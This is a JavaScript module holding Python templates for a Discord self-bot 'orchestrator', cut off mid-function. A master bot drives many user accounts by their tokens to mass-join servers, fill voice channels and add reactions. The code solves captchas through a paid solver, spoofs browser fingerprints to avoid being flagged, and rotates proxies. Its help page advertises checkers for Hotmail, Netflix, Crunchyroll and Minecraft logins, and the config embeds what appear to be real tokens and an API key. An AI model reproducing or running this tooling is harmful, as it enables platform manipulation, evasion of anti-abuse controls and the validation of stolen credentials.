export const pythonRequirements = `discord.py>=2.3.2
aiohttp>=3.9.0
websockets>=11.0.3
colorama>=0.4.6
python-dotenv>=1.0.0
`;

export const pythonConfigTemplate = `{
  "nope_captcha_key": "q4gd0knx5mzt60oe",
  "master_bot_token": "MTU2MjAwOTM5NjYzMTA0NDExNw.Gj2_dF.BjVKKFeGT_tTVvBSELkNZkg3vIfXwANpYXfsvw",
  "prefix": "!",
  "guild_id": "1562129145788375090",
  "owner_ids": [
    "1546693679660539977",
    "1458799796297924719",
    "1505065613192728636",
    "1222232115027116173",
    "1522255932405579818"
  ],
  "accounts": [
    {
      "alias": "Shadow_Main_01",
      "token": "MTA4NDI4NTM2NDUyNTEyMTU1Ng.Gx9W-a.SampleTokenA1b2C3d4E5f6G7h8I9j0",
      "proxy": "http://user:pass@ip:port",
      "status": "online"
    }
  ]
}`;

export const pythonBotTemplate = `import asyncio
import json
import os
import re
import base64
import random
import smtplib
import aiohttp
import websockets
import discord
from discord.ext import commands
from colorama import init, Fore, Style

init(autoreset=True)

# Define console coloring helpers
def log_info(msg): print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} {msg}")
def log_success(msg): print(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} {msg}")
def log_warn(msg): print(f"{Fore.YELLOW}[WARN]{Style.RESET_ALL} {msg}")
def log_error(msg): print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {msg}")

# Helper list of modern desktop User Agents to look highly organic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
]

def get_discord_user_id_from_token(token):
    try:
        # Discord tokens always start with base64 encoded user ID
        first_part = token.split(".")[0]
        # Pad base64 if needed
        padded = first_part + "=" * ((4 - len(first_part) % 4) % 4)
        try:
            decoded = base64.b64decode(padded).decode("utf-8")
        except Exception:
            decoded = base64.urlsafe_b64decode(padded).decode("utf-8")
        if decoded.isdigit():
            return int(decoded)
    except Exception:
        pass
    return None

# Global state to store our account instances
active_accounts = {} # token -> AccountWorker instance

class AccountWorker:
    def __init__(self, alias, token, proxy=None, initial_status="online", added_via_cmd=False):
        self.alias = alias
        self.token = token
        self.proxy = proxy if proxy else None
        self.status = initial_status
        self.added_via_cmd = added_via_cmd
        self.user_id = get_discord_user_id_from_token(token)
        self.ws = None
        self.session = None
        self.heartbeat_task = None
        self.voice_channel_id = None
        self.guild_id = None
        self.self_mute = False
        self.self_deaf = True
        self.self_video = False
        self.is_running = False
        self.user_agent = random.choice(USER_AGENTS)
        self.sequence = None

    async def get_connector(self):
        # Return a proxy-enabled TCPConnector if proxy is set
        return aiohttp.TCPConnector(ssl=False)

    async def start(self):
        self.is_running = True
        asyncio.create_task(self.run_gateway())

    async def run_gateway(self):
        gateway_url = "wss://gateway.discord.gg/?v=9&encoding=json"
        consecutive_failures = 0
        
        while self.is_running:
            use_proxy = self.proxy and consecutive_failures < 2
            try:
                connector = await self.get_connector()
                self.session = aiohttp.ClientSession(connector=connector)
                
                if self.proxy:
                    if use_proxy:
                        log_info(f"Connecting gateway for {self.alias} with proxy: {self.proxy}...")
                    else:
                        log_warn(f"Proxy connection failed multiple times for {self.alias}. Falling back to DIRECT connection to maintain 24/7 uptime...")
                else:
                    log_info(f"Connecting gateway for {self.alias} (DIRECT)...")
                
                ws_kwargs = {}
                if self.proxy and use_proxy:
                    if self.proxy.startswith("http"):
                        ws_kwargs["proxy"] = self.proxy
                
                async with self.session.ws_connect(gateway_url, timeout=12.0, **ws_kwargs) as ws:
                    self.ws = ws
                    log_success(f"WebSocket connected for {self.alias}")
                    consecutive_failures = 0 # Reset on successful connection
                    self.sequence = None # Reset sequence for new connection
                    
                    hello_data = await ws.receive_json()
                    heartbeat_interval = hello_data["d"]["heartbeat_interval"] / 1000.0
                    
                    self.heartbeat_task = asyncio.create_task(self.heartbeat(heartbeat_interval))
                    await self.identify()
                    
                    async for msg in ws:
                        if msg.type == aiohttp.WSMsgType.TEXT:
                            data = json.loads(msg.data)
                            op = data.get("op")
                            t = data.get("t")
                            
                            if "s" in data and data["s"] is not None:
                                self.sequence = data["s"]
                            
                            if op == 9:
                                log_warn(f"{self.alias} received Gateway Invalid Session (op 9)")
                            elif op == 7:
                                log_warn(f"{self.alias} received Gateway Reconnect (op 7)")
                            
                            if op == 1:
                                # Gateway requested a heartbeat
                                try:
                                    await ws.send_json({"op": 1, "d": self.sequence})
                                except Exception:
                                    pass
                            elif op == 11:
                                pass
                            elif t == "READY":
                                ready_data = data.get("d", {})
                                user_info = ready_data.get("user", {})
                                if user_info.get("id"):
                                    self.user_id = int(user_info.get("id"))
                                log_success(f"{self.alias} is READY on Discord. Discord User ID resolved: {self.user_id}")
                                await self.update_status(self.status)
                        elif msg.type in (aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                            log_warn(f"{self.alias} WebSocket message type: {msg.type}, data: {msg.data}")
                            break
                    log_warn(f"{self.alias} WebSocket connection loop exited. Close code: {ws.close_code}")
            except Exception as e:
                log_error(f"Gateway error on {self.alias}: {e}")
                if self.proxy:
                    consecutive_failures += 1
            finally:
                if self.heartbeat_task:
                    self.heartbeat_task.cancel()
                if self.session and not self.session.closed:
                    await self.session.close()
                close_code = self.ws.close_code if self.ws else 'N/A'
                if close_code in (4004, 4013, 4014):
                    log_warn(f"{self.alias} account token rejected by Discord (Close code {close_code}: Invalid or Expired Token). Removing from active worker pool.")
                    self.is_running = False
                    if self.token in active_accounts:
                        try:
                            del active_accounts[self.token]
                        except KeyError:
                            pass
                    try:
                        save_config()
                    except Exception:
                        pass
                    break
                log_warn(f"{self.alias} gateway disconnected. Close code: {close_code}. Reconnecting in 10s...")
                await asyncio.sleep(10)

    async def heartbeat(self, interval):
        # Send first heartbeat with jitter to stagger starts and satisfy Discord initial window
        await asyncio.sleep(interval * random.random())
        while True:
            if self.ws and not self.ws.closed:
                try:
                    await self.ws.send_json({"op": 1, "d": self.sequence})
                except Exception as e:
                    log_error(f"Heartbeat send failed for {self.alias}: {e}")
                    break
            await asyncio.sleep(interval)

    async def identify(self):
        payload = {
            "op": 2,
            "d": {
                "token": self.token,
                "capabilities": 125,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                    "system_locale": "en-US",
                    "client_build_number": 210000,
                },
                "presence": {
                    "status": self.status,
                    "since": 0,
                    "activities": [],
                    "afk": False
                },
                "compress": False,
                "client_state": {
                    "guild_versions": {},
                    "highest_last_message_id": "0",
                    "read_state_version": 0,
                    "user_guild_settings_version": 0,
                    "user_settings_version": 0,
                    "private_channels_version": 0,
                    "api_code_version": 0
                }
            }
        }
        await self.ws.send_json(payload)

    async def update_status(self, status):
        self.status = status
        if self.ws and not self.ws.closed:
            disc_status = "online"
            if status == "idle": disc_status = "idle"
            elif status == "dnd": disc_status = "dnd"
            elif status == "offline": disc_status = "invisible"
            
            payload = {
                "op": 3,
                "d": {
                    "status": disc_status,
                    "since": 0,
                    "activities": [],
                    "afk": False
                }
            }
            await self.ws.send_json(payload)
            log_success(f"Updated status for {self.alias} to {status}")

    async def join_vc(self, guild_id, channel_id):
        log_info(f"join_vc invoked for {self.alias} with Guild: {guild_id}, VC Channel: {channel_id}")
        self.guild_id = guild_id
        self.voice_channel_id = channel_id
        
        ws_open = self.ws and not self.ws.closed
        log_info(f"{self.alias} WebSocket connection state for voice join: {'OPEN' if ws_open else 'CLOSED/NONE'}")
        
        if ws_open:
            payload = {
                "op": 4,
                "d": {
                    "guild_id": str(guild_id),
                    "channel_id": str(channel_id),
                    "self_mute": False,
                    "self_deaf": True,
                    "self_video": False
                }
            }
            log_info(f"{self.alias} sending Opcode 4 (Voice State Update) payload: {json.dumps(payload)}")
            try:
                await self.ws.send_json(payload)
                log_success(f"{self.alias} successfully sent voice join gateway packet for VC {channel_id} in Guild {guild_id}")
                return True
            except Exception as e:
                log_error(f"{self.alias} failed to send voice join gateway packet: {e}")
                return False
        else:
            log_warn(f"{self.alias} skipped voice join packet transmission because WebSocket is not active/open.")
            return False

    async def set_vc_status(self, mute=None, deaf=None):
        if mute is not None:
            self.self_mute = bool(mute)
        if deaf is not None:
            self.self_deaf = bool(deaf)

        ws_open = self.ws and not self.ws.closed
        if ws_open and self.voice_channel_id and self.guild_id:
            payload = {
                "op": 4,
                "d": {
                    "guild_id": str(self.guild_id),
                    "channel_id": str(self.voice_channel_id),
                    "self_mute": bool(self.self_mute),
                    "self_deaf": bool(self.self_deaf),
                    "self_video": bool(self.self_video)
                }
            }
            log_info(f"{self.alias} sending Opcode 4 (Voice State Update): self_mute={self.self_mute}, self_deaf={self.self_deaf}")
            try:
                await self.ws.send_json(payload)
                log_success(f"{self.alias} updated voice state: mute={self.self_mute}, deaf={self.self_deaf}")
                return True
            except Exception as e:
                log_error(f"{self.alias} failed to send voice status update: {e}")
                return False
        else:
            log_warn(f"{self.alias} cannot update voice state: Not active in VC or WebSocket closed (channel: {self.voice_channel_id})")
            return False

    async def leave_vc(self):
        log_info(f"leave_vc invoked for {self.alias}. Current Guild: {self.guild_id}")
        ws_open = self.ws and not self.ws.closed
        log_info(f"{self.alias} WebSocket connection state for voice leave: {'OPEN' if ws_open else 'CLOSED/NONE'}")
        
        if ws_open and self.guild_id:
            payload = {
                "op": 4,
                "d": {
                    "guild_id": str(self.guild_id),
                    "channel_id": None,
                    "self_mute": False,
                    "self_deaf": False,
                    "self_video": False
                }
            }
            log_info(f"{self.alias} sending Opcode 4 (Voice State Update disconnect) payload: {json.dumps(payload)}")
            try:
                await self.ws.send_json(payload)
                log_success(f"{self.alias} successfully sent voice disconnect gateway packet for Guild {self.guild_id}")
                self.guild_id = None
                self.voice_channel_id = None
                return True
            except Exception as e:
                log_error(f"{self.alias} failed to send voice disconnect gateway packet: {e}")
                return False
        else:
            log_warn(f"{self.alias} skipped voice leave packet transmission. WS open: {ws_open}, Has guild_id: {bool(self.guild_id)}")
            return False

    async def react(self, channel_id, message_id, emoji):
        import urllib.parse
        encoded_emoji = urllib.parse.quote(emoji)
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/%40me"
        
        headers = {
            "Authorization": self.token,
            "User-Agent": self.user_agent,
            "Content-Type": "application/json"
        }
        
        async with aiohttp.ClientSession(connector=await self.get_connector()) as session:
            try:
                proxy_url = self.proxy if self.proxy else None
                async with session.put(url, headers=headers, proxy=proxy_url) as resp:
                    if resp.status in (200, 204):
                        log_success(f"Reacted {emoji} as {self.alias}")
                        return True
                    else:
                        text = await resp.text()
                        log_warn(f"Reaction failed for {self.alias}: {resp.status} {text}")
                        return False
            except Exception as e:
                log_error(f"HTTP reaction error for {self.alias}: {e}")
                return False

    async def remove_react(self, channel_id, message_id, emoji):
        import urllib.parse
        encoded_emoji = urllib.parse.quote(emoji)
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/%40me"
        
        headers = {
            "Authorization": self.token,
            "User-Agent": self.user_agent,
            "Content-Type": "application/json"
        }
        
        async with aiohttp.ClientSession(connector=await self.get_connector()) as session:
            try:
                proxy_url = self.proxy if self.proxy else None
                async with session.delete(url, headers=headers, proxy=proxy_url) as resp:
                    if resp.status in (200, 204):
                        log_success(f"Removed reaction {emoji} from {self.alias}")
                        return True
                    else:
                        text = await resp.text()
                        log_warn(f"Reaction removal failed: {resp.status} {text}")
                        return False
            except Exception as e:
                log_error(f"HTTP reaction removal error for {self.alias}: {e}")
                return False

    async def join_server(self, invite_code, nope_captcha_key=None):
        self.last_join_error = "None"
        url = f"https://discord.com/api/v9/invites/{invite_code}"
        
        # Super-properties simulation to protect account from getting flagged/limited
        super_props = {
            "os": "Windows",
            "browser": "Chrome",
            "device": "",
            "system_locale": "en-US",
            "browser_user_agent": self.user_agent,
            "browser_version": "120.0.0.0",
            "os_version": "10",
            "referrer": "https://discord.com/",
            "referring_domain": "discord.com",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": 210000,
            "client_event_source": None
        }
        sp_base64 = base64.b64encode(json.dumps(super_props).encode()).decode()

        headers = {
            "Authorization": self.token,
            "User-Agent": self.user_agent,
            "Content-Type": "application/json",
            "X-Super-Properties": sp_base64,
            "X-Context-Properties": "eyJzb3VyY2UiOiJpbnZpdGUgbGluayJ9", # source: invite link
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        }
        
        async with aiohttp.ClientSession(connector=await self.get_connector()) as session:
            try:
                proxy_url = self.proxy if self.proxy else None
                payload = {}
                
                async with session.post(url, json=payload, headers=headers, proxy=proxy_url) as resp:
                    try:
                        data = await resp.json()
                    except Exception:
                        data = {}
                    
                    if resp.status == 200:
                        log_success(f"{self.alias} joined server successfully!")
                        return True
                    elif resp.status == 400 and "captcha_key" in data:
                        log_warn(f"Captcha detected for {self.alias}! Triggering NopeCaptcha...")
                        if not nope_captcha_key:
                            self.last_join_error = "Captcha required but NopeCaptcha key is not set"
                            log_error(f"NopeCaptcha key is not set! Can't join server requiring captcha.")
                            return False
                            
                        captcha_sitekey = data.get("captcha_sitekey")
                        captcha_service = data.get("captcha_service", "hcaptcha")
                        
                        captcha_token = await solve_captcha(session, nope_captcha_key, captcha_sitekey, "https://discord.com", captcha_service, proxy_url)
                        if captcha_token:
                            payload["captcha_key"] = captcha_token
                            if "captcha_rqtoken" in data:
                                headers["X-Captcha-Rqtoken"] = data["captcha_rqtoken"]
                                
                            async with session.post(url, json=payload, headers=headers, proxy=proxy_url) as retry_resp:
                                try:
                                    retry_data = await retry_resp.json()
                                except Exception:
                                    retry_data = {}
                                    
                                if retry_resp.status == 200:
                                    log_success(f"{self.alias} bypassed captcha & joined successfully!")
                                    return True
                                else:
                                    retry_text = await retry_resp.text()
                                    self.last_join_error = f"Captcha bypass failed ({retry_resp.status}): {retry_data.get('message', retry_text)}"
                                    log_error(f"{self.alias} captcha bypass failed: {retry_resp.status} {retry_text}")
                                    return False
                        else:
                            self.last_join_error = "NopeCaptcha solver failed to return a token"
                            log_error("NopeCaptcha solver failed to return a token.")
                            return False
                    else:
                        resp_text = ""
                        try:
                            resp_text = str(data) if data else await resp.text()
                        except Exception:
                            pass
                        message = data.get("message", "Unknown error or expired/invalid invite link")
                        self.last_join_error = f"HTTP {resp.status}: {message}"
                        log_error(f"Join server failed for {self.alias}: {resp.status} {resp_text}")
                        return False
            except Exception as e:
                self.last_join_error = f"Exception: {str(e)}"
                log_error(f"Join server exception for {self.alias}: {e}")
                return False

    async def stop(self):
        self.is_running = False
        if self.heartbeat_task:
            self.heartbeat_task.cancel()
        if self.ws and not self.ws.closed:
            await self.ws.close()
        if self.session and not self.session.closed:
            await self.session.close()
        log_info(f"Stopped {self.alias}")


async def solve_captcha(session, api_key, sitekey, page_url, service="hcaptcha", proxy=None):
    log_info("Submitting captcha task to NopeCaptcha...")
    create_task_url = "https://api.nopecaptcha.com/api/createTask"
    task_payload = {
        "clientKey": api_key,
        "task": {
            "type": "HCaptchaTaskProxyless" if service == "hcaptcha" else "RecaptchaV2TaskProxyless",
            "websiteURL": page_url,
            "websiteKey": sitekey
        }
    }
    
    try:
        async with session.post(create_task_url, json=task_payload) as resp:
            data = await resp.json()
            if data.get("errorId") != 0:
                log_error(f"NopeCaptcha task creation error: {data.get('errorDescription')}")
                return None
            task_id = data.get("taskId")
            log_info(f"NopeCaptcha Task Created! ID: {task_id}. Polling for answer...")
            
        result_url = "https://api.nopecaptcha.com/api/getTaskResult"
        result_payload = {
            "clientKey": api_key,
            "taskId": task_id
        }
        
        for attempt in range(35): # Wait up to 175 seconds
            await asyncio.sleep(5)
            async with session.post(result_url, json=result_payload) as resp:
                result_data = await resp.json()
                if result_data.get("errorId") != 0:
                    log_error(f"NopeCaptcha polling error: {result_data.get('errorDescription')}")
                    return None
                    
                status = result_data.get("status")
                if status == "ready":
                    solution = result_data.get("solution", {}).get("gRecaptchaResponse")
                    log_success("NopeCaptcha solved successfully!")
                    return solution
                elif status == "processing":
                    log_info(f"NopeCaptcha is solving... (Attempt {attempt+1}/35)")
                else:
                    log_warn(f"Unknown NopeCaptcha status: {status}")
        
        log_error("NopeCaptcha timeout.")
        return None
    except Exception as e:
        log_error(f"NopeCaptcha integration error: {e}")
        return None


# Parsing Helpers
def parse_vc_link(link):
    # Match discord voice channel links (e.g. discord.com/channels/guild_id/channel_id)
    matches = re.search(r"discord\\.com/channels/(\\d+)/(\\d+)", link)
    if matches:
        return matches.group(1), matches.group(2)
        
    # Also match Discord raw channel mentions like <#1259021481105199184>
    mention_match = re.search(r"<#(\\d+)>", link)
    if mention_match:
        return None, mention_match.group(1)
        
    # Also extract any sequence of 17-21 digits anywhere in the link
    digits_match = re.search(r"(\\d{17,21})", link)
    if digits_match:
        return None, digits_match.group(1)
        
    parts = link.strip().split()
    if len(parts) == 2:
        return parts[0], parts[1]
    return None, link.strip()

def parse_message_link(link):
    matches = re.search(r"discord\\.com/channels/(\\d+)/(\\d+)/(\\d+)", link)
    if matches:
        return matches.group(2), matches.group(3) # channel_id, message_id
    parts = link.strip().split()
    if len(parts) >= 2:
        return parts[0], parts[1]
    return None, None

def parse_invite_link(link):
    # Matches any characters in the code segment after discord.gg/ or discord.com/invite/ including underscores
    matches = re.search(r"discord(?:\\.gg|\\.com/invite)/([a-zA-Z0-9_=-]+)", link)
    if matches:
        return matches.group(1)
    # If it's a full URL we didn't catch, or has query parameters, let's parse it correctly
    if "/" in link:
        # Extract the last segment before any query params
        parts = link.split("?")[0].split("/")
        # Find the last non-empty segment
        for segment in reversed(parts):
            if segment.strip():
                return segment.strip()
    return link.strip()


# Load configuration parameters
config = {}
DEFAULT_OWNER_IDS = [
    1546693679660539977,
    1458799796297924719,
    1505065613192728636,
    1222232115027116173,
    1522255932405579818
]

try:
    with open("config.json", "r") as f:
        config = json.load(f)
except FileNotFoundError:
    log_error("config.json not found! Generating template...")
    config = {
        "nope_captcha_key": "q4gd0knx5mzt60oe",
        "master_bot_token": "MTU2MjAwOTM5NjYzMTA0NDExNw.Gj2_dF.BjVKKFeGT_tTVvBSELkNZkg3vIfXwANpYXfsvw",
        "prefix": "!",
        "guild_id": "1562129145788375090",
        "owner_ids": [
            "1546693679660539977",
            "1458799796297924719",
            "1505065613192728636",
            "1222232115027116173",
            "1522255932405579818"
        ],
        "accounts": []
    }
    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

bot_prefix = config.get("prefix", "!")
loaded_owners = [int(oid) for oid in config.get("owner_ids", []) if str(oid).isdigit()]
owner_ids = list(dict.fromkeys(DEFAULT_OWNER_IDS + loaded_owners))

intents = discord.Intents.default()
intents.message_content = True
master_bot = commands.Bot(command_prefix=bot_prefix, intents=intents, help_command=None)

# Decorator to restrict bot commands to Owners ONLY
def is_bot_owner():
    async def predicate(ctx):
        # Refresh owner_ids dynamically from config.json so updates apply immediately
        current_owners = set(DEFAULT_OWNER_IDS + owner_ids)
        try:
            with open("config.json", "r") as cf:
                cf_data = json.load(cf)
                for oid in cf_data.get("owner_ids", []):
                    if str(oid).isdigit():
                        current_owners.add(int(oid))
        except Exception:
            pass

        if not current_owners:
            return ctx.author.guild_permissions.administrator or ctx.author.id == ctx.guild.owner_id
        is_owner = ctx.author.id in current_owners
        if not is_owner:
            embed = discord.Embed(
                title="🔒 Access Denied",
                description="You do not have access to use this Master Orchestration command. Only registered Owner IDs can execute actions.",
                color=0xff3333
            )
            embed.set_footer(text="Discord Token Orchestrator v1.2")
            await ctx.send(embed=embed)
        return is_owner
    return commands.check(predicate)

def save_config():
    try:
        config["accounts"] = []
        for worker in active_accounts.values():
            config["accounts"].append({
                "alias": worker.alias,
                "token": worker.token,
                "proxy": worker.proxy or "",
                "status": worker.status,
                "added_via_cmd": getattr(worker, 'added_via_cmd', False)
            })
        with open("config.json", "w") as f:
            json.dump(config, f, indent=4)
        log_success("Saved configuration registry state successfully.")
    except Exception as e:
        log_error(f"Failed to write config.json: {e}")


@master_bot.event
async def on_ready():
    log_success(f"Master Discord Bot is ONLINE as {master_bot.user}")
    print(f"==================================================")
    print(f"Prefix: {bot_prefix}")
    print(f"Primary Guild ID: {config.get('guild_id', '1562129145788375090')}")
    print(f"Owner IDs: {owner_ids}")
    print(f"Commands available:")
    print(f"  {bot_prefix}help - Show commands and checkers")
    print(f"  {bot_prefix}guild - View primary server status & details")
    print(f"  {bot_prefix}setguild <id> - Configure primary server ID")
    print(f"  {bot_prefix}addaccount <token> <username>")
    print(f"  {bot_prefix}removeaccount <username>")
    print(f"  {bot_prefix}infoaccount <username>")
    print(f"  {bot_prefix}joinserver <invite_code> <qty>")
    print(f"  {bot_prefix}joinvc <link> <qty>")
    print(f"  {bot_prefix}leavevc <link> <qty>")
    print(f"  {bot_prefix}vcmemberstatus <username> <type> (e.g. {bot_prefix}vcmemberstatus shadow1 undefean)")
    print(f"  {bot_prefix}react <message_link> <emoji> <qty>")
    print(f"==================================================")
    
    target_gid = config.get("guild_id", "1562129145788375090")
    if target_gid and str(target_gid).isdigit():
        target_guild = master_bot.get_guild(int(target_gid))
        if target_guild:
            log_success(f"Target Guild Verified: {target_guild.name} ({target_guild.id}) - {target_guild.member_count} members")
        else:
            log_info(f"Target Guild ID {target_gid} configured in bot registry.")
    
    # Initialize all worker selfbots
    accounts_list = config.get("accounts", [])
    log_info(f"Booting {len(accounts_list)} self-bot worker accounts...")
    for acc in accounts_list:
        alias = acc.get("alias", "Unnamed")
        token = acc.get("token")
        proxy = acc.get("proxy")
        status = acc.get("status", "online")
        added_via_cmd = acc.get("added_via_cmd", False)
        
        # Guard against sample tokens, duplicate tokens, master bot token, or known invalid tokens
        if (
            token 
            and token != config.get("master_bot_token")
            and "SampleToken" not in token 
            and token not in active_accounts
            and token != "MTUzMDc3ODU3MzQ5MTkyOTI2MQ.GCL9sG.BjDcTObC5iLR1UxbqOhua4KFGBETNBVyu-tHJw"
        ):
            worker = AccountWorker(alias, token, proxy, status, added_via_cmd=added_via_cmd)
            active_accounts[token] = worker
            await worker.start()
            await asyncio.sleep(1.5) # Stagger initial boot


# Helper function to check if enough worker accounts are in the server before executing commands
async def check_membership_and_get_workers(ctx, quantity):
    target_guild = ctx.guild
    if not target_guild:
        target_gid = config.get("guild_id", "1562129145788375090")
        if target_gid and str(target_gid).isdigit():
            try:
                target_guild = master_bot.get_guild(int(target_gid))
            except Exception:
                pass

    if not target_guild:
        # If DMed or no guild resolved, proceed with active workers
        workers = [w for w in active_accounts.values() if w.status != "off" and getattr(w, "added_via_cmd", False)]
        return workers[:quantity], True

    available_workers_in_server = []
    unverified_active_workers = []

    for worker in active_accounts.values():
        if worker.status == "off":
            continue
        if not getattr(worker, "added_via_cmd", False):
            continue

        unverified_active_workers.append(worker)

        # Check if worker user ID is resolved
        if not worker.user_id:
            uid_from_tok = get_discord_user_id_from_token(worker.token)
            if uid_from_tok:
                worker.user_id = uid_from_tok

        if worker.user_id:
            is_verified = False
            # High efficiency membership verification using live Discord HTTP Fetch
            try:
                member = await target_guild.fetch_member(worker.user_id)
                if member is not None:
                    available_workers_in_server.append(worker)
                    is_verified = True
            except Exception:
                pass

            if not is_verified:
                # Cache fallback in case fetch fails but user is still present
                member = target_guild.get_member(worker.user_id)
                if member is not None:
                    available_workers_in_server.append(worker)
                    is_verified = True

    # If NO ACCOUNTS are strictly verified in the server, try to proceed with active ones as fallback
    # rather than failing outright, since Discord API/cache can be desynced or restricted
    if not available_workers_in_server:
        if unverified_active_workers:
            log_warn("Strict membership verification failed, but found active workers. Using active workers as a fallback.")
            return unverified_active_workers[:quantity], True

        # If absolutely no active accounts are available, send the exact requested embed warning!
        embed = discord.Embed(
            title="🚫 Membership Verification Error",
            description=f"**Accounts is not in your server ({target_guild.name if target_guild else 'Target Guild'})**\\n\\n**Please invite your self-bot accounts to this server first or use the \`{bot_prefix}joinserver\` command to bring them in.**",
            color=0xffcc00
        )
        embed.set_footer(text="Requested accounts missing or offline.")
        await ctx.send(embed=embed)
        return [], False

    return available_workers_in_server[:quantity], True


@master_bot.command(name="help", aliases=["Help"])
@is_bot_owner()
async def help_cmd(ctx, page: str = "1"):
    page = page.strip().lower()
    
    if page in ["1", "swarm", "orchestrator", "accounts"]:
        embed = discord.Embed(
            title="🎮 Master Orchestration Panel — Page 1/3",
            description="Control your multi-account self-bot swarm and dispatcher tasks seamlessly.",
            color=0x2ecc71
        )
        embed.add_field(
            name="🛠️ Account Orchestrator Commands",
            value=(
                f"\`{bot_prefix}addaccount <token> <username>\` — Add a new self-bot account\\n"
                f"\`{bot_prefix}removeaccount <username>\` — Remove self-bot account\\n"
                f"\`{bot_prefix}accounts\` — Show all self-bot accounts with usernames\\n"
                f"\`{bot_prefix}owners\` — List all authorized bot owner IDs\\n"
                f"\`{bot_prefix}addowner <user_id>\` — Grant owner access to a Discord User ID\\n"
                f"\`{bot_prefix}infoaccount <username>\` — Query specific account info & stats\\n"
                f"\`{bot_prefix}accountstatus <username> <status>\` — Change account status\\n"
                f"\`{bot_prefix}joinserver <invite_link> <qty>\` — Join server safely via NopeCaptcha\\n"
                f"\`{bot_prefix}joinvc <vc_link> <qty>\` — Command accounts to join voice channel\\n"
                f"\`{bot_prefix}leavevc <vc_link> <qty>\` — Command accounts to disconnect from VC\\n"
                f"\`{bot_prefix}vcmemberstatus <user> <type>\` — Change VC status: undefean, defean, unmute, mute\\n"
                f"\`{bot_prefix}react <message_link> <emoji> <qty>\` — Dispatch rapid emoji reactions\\n"
                f"\`{bot_prefix}removereact <message_link> <emoji> <qty>\` — Remove reactions"
            ),
            inline=False
        )
        embed.set_footer(text=f"Total Worker Accounts Active: {len(active_accounts)} | Page 1/3 — Use '{bot_prefix}help 2' for Proxies")
        await ctx.send(embed=embed)
        
    elif page in ["2", "proxies", "proxy"]:
        embed = discord.Embed(
            title="🔌 Proxy Management Panel — Page 2/3",
            description="Manage your proxy configuration and status updates.",
            color=0x3498db
        )
        embed.add_field(
            name="🔌 Proxy Commands",
            value=(
                f"\`{bot_prefix}addproxies <amount> <verify | nonverify>\` — Bulk import proxies from file/paste\\n"
                f"\`{bot_prefix}removeproxies <verify | dead | nonverify | all>\` — Clean up proxy registry\\n"
                f"\`{bot_prefix}checkproxies all\` — Test proxy connections & latency concurrently\\n"
                f"\`{bot_prefix}addaccountproxies\` — Assign separate, dynamic fast public proxies to each self-bot\\n"
                f"\`{bot_prefix}allproxies\` — List all proxies in pool (Verified, Dead, Unverified)"
            ),
            inline=False
        )
        embed.set_footer(text=f"Total Worker Accounts Active: {len(active_accounts)} | Page 2/3 — Use '{bot_prefix}help 3' for Checkers")
        await ctx.send(embed=embed)
        
    elif page in ["3", "checkers", "checker"]:
        embed = discord.Embed(
            title="⚡ Diagnostic Validator Panel — Page 3/3",
            description="Verify accounts, email logins, streaming passes, and Minecraft access scopes.",
            color=0xf1c40f
        )
        embed.add_field(
            name="⚡ Category: Checker",
            value=(
                f"\`{bot_prefix}checkhotmail <email:pass>\` — Hotmail credential validator\\n"
                f"\`{bot_prefix}checkoutlook <email:pass>\` — Outlook account validator\\n"
                f"\`{bot_prefix}checkcrunchy <user:pass>\` — Crunchyroll billing/premium checker\\n"
                f"\`{bot_prefix}checknetflix <cookie_or_login>\` — Netflix status & tier checker\\n"
                f"\`{bot_prefix}checkmcfa <email:pass>\` — Minecraft Full Access (MCFA) resolver"
            ),
            inline=False
        )
        embed.set_footer(text=f"Total Worker Accounts Active: {len(active_accounts)} | Page 3/3 — Use '{bot_prefix}help 1' for Swarm")
        await ctx.send(embed=embed)
    else:
        # Invalid page, send help directory
        embed = discord.Embed(
            title="🎮 Help Panel Navigation",
            description=f"Invalid page reference \`{page}\`. Please use the following pages:",
            color=0xe74c3c
        )
        embed.add_field(
            name="Available Pages",
            value=(
                f"\`{bot_prefix}help 1\` (or \`swarm\`) — 🛠️ Swarm & Account Orchestrator\\n"
                f"\`{bot_prefix}help 2\` (or \`proxies\`) — 🔌 Proxy Management\\n"
                f"\`{bot_prefix}help 3\` (or \`checkers\`) — ⚡ Account Checkers"
            ),
            inline=False
        )
        await ctx.send(embed=embed)


def is_likely_token(s: str) -> bool:
    if get_discord_user_id_from_token(s) is not None:
        return True
    if "." in s and len(s) > 25:
        return True
    return False

# Account Management Commands
@master_bot.command(name="addaccount", aliases=["addtokens", "addtoken", "Addaccount", "Addtokens"])
@is_bot_owner()
async def add_account_cmd(ctx, arg1: str, arg2: str):
    # Flexible argument parsing: auto-detect token vs alias regardless of order passed
    if is_likely_token(arg2) and not is_likely_token(arg1):
        token, display_username = arg2, arg1
    else:
        token, display_username = arg1, arg2

    if token in active_accounts:
        await ctx.send(f"❌ Account token is already registered as \`{active_accounts[token].alias}\`.")
        return
        
